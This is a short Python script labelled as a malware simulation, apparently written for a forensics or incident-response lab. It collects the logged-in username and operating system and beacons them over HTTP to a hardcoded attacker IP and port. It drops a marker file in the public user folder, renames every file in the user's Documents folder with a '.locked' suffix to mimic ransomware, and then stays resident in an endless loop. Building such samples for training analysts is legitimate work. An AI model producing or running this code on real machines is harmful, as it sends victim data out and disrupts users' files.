import time
import requests
import platform
import os

# 1. Reconnaissance (Identify the victim)
user = os.getlogin()
system = platform.system()

# 2. C2 Simulation (Data Exfiltration)
# Simulates a "phone home" to the attacker's machine
attacker_ip = "192.168.56.30"
attacker_port = 8000

try:
    # Send user info to attacker server
    url = f"http://{attacker_ip}:{attacker_port}/connect?user={user}&os={system}"
    requests.get(url, timeout=5)
except:
    pass

# 3. File Dropper
# Leaves a physical trace on the disk to simulate payload dropping
try:
    with open("C:\\Users\\Public\\malware_log.txt", "w") as f:
        f.write("I was here.")
except:
    pass

# 4. Ransomware Simulation (Loop through Documents)
try:
    docs_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    
    for filename in os.listdir(docs_path):
        file_path = os.path.join(docs_path, filename)
        
        # Check if it's a file and not already locked
        if os.path.isfile(file_path) and not filename.endswith(".locked"):
            try:
                os.rename(file_path, file_path + ".locked")
            except:
                continue
except:
    pass

# 5. Persistence (Process Analysis)
# Keep the process alive to appear in RAM analysis
while True:
    time.sleep(60)